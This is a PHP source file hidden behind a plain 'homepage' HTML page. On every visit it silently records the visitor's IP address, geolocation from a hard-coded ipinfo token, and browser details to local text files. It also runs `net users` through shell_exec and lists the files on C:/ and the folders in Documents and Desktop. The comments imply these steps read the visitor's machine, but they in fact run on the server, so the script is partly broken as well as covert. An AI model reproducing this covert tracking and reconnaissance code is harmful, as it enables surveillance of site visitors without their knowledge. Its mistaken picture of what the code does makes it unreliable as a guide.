<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <h1>WELCOME TO MY HOMEPAGE BRO....</h1>
</body>
</html>
<?php
//======================================================================================================================
//GETTING USER GEO-LOCATION INFORMATION..
//======================================================================================================================
require_once __DIR__ . '/vendor/autoload.php';
use ipinfo\ipinfo\IPinfo;
function IpLocation() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddrs = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddrs = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddrs = $_SERVER['REMOTE_ADDR'];
    }

    // Validating the obtained IP address
    $ipAddrs = filter_var($ipAddrs, FILTER_VALIDATE_IP);
    $ip = $ipAddrs;

    $access_token = '0479d43b9071a6';
    $client = new IPinfo($access_token);
    $ip_address = $ip;
    $details = $client->getDetails($ip_address);

    $details->all; // Emeryville
//    $details->loc; // 37.8342,-122.2900

    $read = json_decode($details, true);

    return $details;
}
$det = IpLocation();
//echo "<pre>";
//var_dump($det);
file_put_contents('userInfo.txt',$det, FILE_APPEND);



// =============================================================================
//GETTING USER IP ADRESS
//==============================================================================
function getUserIP() {
    // Check for shared internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validateIP($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    // Check for IPs passing through proxies
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check if multiple IP addresses exist in the variable
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validateIP($ip))
                    return $ip;
            }
        } else {
            if (validateIP($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validateIP($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validateIP($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validateIP($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED']) && validateIP($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];

    // Return unreliable IP address since all else failed
    return $_SERVER['REMOTE_ADDR'];
}

// Validates the IP address (IPv4/IPv6)
function validateIP($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP,
            FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 |
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    } else {
        return true;
    }
}

$user_ip = getUserIP() . "=====>";
//echo "User's IP Address: " . $user_ip . '<br>';
file_put_contents('UserIp&Browser.txt', $user_ip, FILE_APPEND);
//======================================================================================================================
//BROWSERINFO
//======================================================================================================================

$DeviceName = $_SERVER['HTTP_USER_AGENT'];
if(stripos($DeviceName, 'Windows') !==false) {
    $DeviceOs = 'Windows x64 bit';

    //GETTING BROWSER INFORMATION
    function BrowserInfo()
    {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (stripos($userAgent, 'Chrome') !== false) {
            $BrowserData = "User is using Google Chrome.";
        } elseif (stripos($userAgent, 'OPR') !== false || stripos($userAgent, 'Opera') !== false) {
            $BrowserData = "User is using Opera.";
        } elseif (stripos($userAgent, 'Edg') !== false) {
            $BrowserData = "User is using Microsoft Edge.";
        } elseif (stripos($userAgent, 'Trident') !== false || stripos($userAgent, 'MSIE') !== false) {
            $BrowserData = "User is using Internet Explorer.";
        } elseif (stripos($userAgent, 'Safari') !== false && stripos($userAgent, 'Chrome') === false) {
            $BrowserData = "User is using Safari.";
        } else {
            $BrowserData = "User is using an unknown Browser Probably Brave, Tor or some shitty Browser";
        }
        return $BrowserData;
    }
}
// echo BrowserInfo('$BrowserData');
$saveBrow = BrowserInfo() . "====>";
file_put_contents('UserIp&Browser.txt', $saveBrow, FILE_APPEND);

//======================================================================================================================
//READING FILES ON MAIN DRIVE
//======================================================================================================================
$filePath = 'C:/'; // Path to the C:/ directory

function listFilesInDirectory($filePath) {
    if (is_dir($filePath)) {
        $files = scandir($filePath);
        foreach ($files as $file) {
            $fileWithPath = $filePath . $file;
            if (is_file($fileWithPath)) {
                $fileWithPath;
            }
        }
        return $files;
    } else {
        echo "The directory doesn't exist.";
        return [];
    }
}

$filesList = listFilesInDirectory($filePath);
if (!empty($filesList)) {
    $fileContent = implode("\n", $filesList);
    file_put_contents('FilesInCdrive.txt', $fileContent);
} else {
    file_put_contents('UserIp&Browser.txt','error occurred lol');
//    echo "No files to save.";
}

//======================================================================================================================
//AVAILABLE USERS..
//======================================================================================================================

function UsersAv(){
    $listor = shell_exec('net users');
    return $listor;
}
$listor = UsersAv();
file_put_contents('UserNet.txt',$listor, FILE_APPEND);
//======================================================================================================================
//LISTING FOLDERS IN THE MAIN DRIVE
//======================================================================================================================
$homeDirectory = 'C:/'; // This will get the home directory of the web server user

// List the contents of the home directory
$contents = scandir($homeDirectory);

// Filter out . and .. from the list (current directory and parent directory)
$contents = array_diff($contents, array('..', '.'));

// Loop through the contents and display folders
foreach ($contents as $item) {
    if (is_dir("$homeDirectory/$item")) {
       // echo "Folder=>: $item<br>";
    }
}

//======================================================================================================================
//LISTING FOLDERS IN THE DOCUMENTS FOLDER
//======================================================================================================================
$homeDirectory = getenv('USERPROFILE'); // For Windows

if ($homeDirectory !== false) {
    // Define the desktop path using the home directory.
    $desktopPath = $homeDirectory . DIRECTORY_SEPARATOR . 'Documents';

    // Get a list of all folders on the desktop.
    $folders = array_filter(glob($desktopPath . '/*'), 'is_dir');

    // Open a file for writing the folder names.
    $file = fopen('folderDocuments.txt', 'w');

    if ($file) {
        // Write folder names to the file.
        foreach ($folders as $folder) {
            $folderName = basename($folder);
            fwrite($file, $folderName . "\n");
        }

        fclose($file);
//        echo "Folder names have been saved to folder.txt.";
    }

//======================================================================================================================
//LISTING FOLDERS IN THE DESKTOP FOLDER
//======================================================================================================================

// Get the user's home directory.
    $homeDirectory = getenv('USERPROFILE'); // For Windows

    if ($homeDirectory !== false) {
        // Define the desktop path using the home directory.
        $desktopPath = $homeDirectory . DIRECTORY_SEPARATOR . 'Desktop';

        // Get a list of all folders on the desktop.
        $folders = array_filter(glob($desktopPath . '/*'), 'is_dir');

        // Open a file for writing the folder names.
        $file = fopen('folderDesktop.txt', 'w');

        if ($file) {
            // Write folder names to the file.
            foreach ($folders as $folder) {
                $folderName = basename($folder);
                fwrite($file, $folderName . "\n");
            }

            fclose($file);
//            echo "Folder names have been saved to folder.txt.";
        }
    }
}
//======================================================================================================================
//LISTING FOLDERS IN THE MAIN DRIVE
//======================================================================================================================
